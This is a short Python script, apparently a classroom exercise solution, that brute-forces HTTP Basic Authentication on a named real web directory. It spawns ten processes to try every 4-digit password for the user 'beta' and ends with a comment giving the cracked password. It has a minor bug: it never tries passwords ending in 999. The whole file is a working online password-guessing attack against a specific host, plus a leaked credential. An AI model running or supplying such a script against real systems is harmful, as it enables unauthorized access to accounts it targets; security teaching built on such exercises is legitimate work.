import requests
from requests.auth import HTTPBasicAuth
import multiprocessing
'''
Try to access "http://ncnu.ipv6.club.tw/Test".
The directory is protected by an authentication password.
We know one username is "beta", and her password is a 4-digit number.
Write a Python program to guess her password.
    If you guess correctly, the response code is 200 (OK).
    If you guess incorrectly, the response code is 401 (Unauthorized).

'''

#
#2
#3


find = multiprocessing.Value('i', 0) 
def job(times):
	global find
	for i in range(times*1000, times*1000+999):
		if find.value == 1:
			break
		passwd = str(i).zfill(4)
		res = requests.get('http://ncnu.ipv6.club.tw/Test', 
						auth=('beta', passwd))
		if res.status_code != 401:
			print('----------The password is :', passwd)
			find.value = 1
			break
		print(res, passwd)

# for i in range(0, 9999):
# 	passwd = str(i).zfill(4)
# 	res = requests.get('http://ncnu.ipv6.club.tw/Test', 
# 		auth=HTTPBasicAuth('beta', passwd))
# 	if res.status_code != 401:
# 		print('The password is :', passwd)
# 		break
# 	print(res, passwd)

def main():
	
	procs = []
	for num in range(0, 10):
		p = multiprocessing.Process(target=job,args=(num, ))
		p.start()
		procs.append(p)
	for proc in procs:
		proc.join()
main()

# The password is 5225